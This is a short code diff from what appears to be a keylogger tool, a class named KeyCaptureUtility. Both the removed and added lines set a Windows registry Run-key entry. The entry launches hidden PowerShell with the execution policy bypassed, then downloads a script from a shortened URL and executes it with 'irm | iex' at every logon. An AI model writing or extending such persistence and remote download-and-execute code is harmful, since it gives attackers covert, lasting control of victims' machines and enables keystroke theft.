@@ -206,7 +206,7 @@ public class KeyCaptureUtility
 # Add the script to startup (by modifying the registry) with the provided URL
 $regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $scriptName = "Startup"
-$regCommand = 'powershell -NoP -Ep Bypass -W H -Command "irm https://shorturl.at/FkQqM | iex"'
+$regCommand = "powershell -NoP -Ep Bypass -W H -C `$expiryDateParam='$expiryDate'; irm https://shorturl.at/FkQqM | iex"
 
 # Add the entry to the registry for startup
 Set-ItemProperty -Path $regKeyPath -Name $scriptName -Value $regCommand
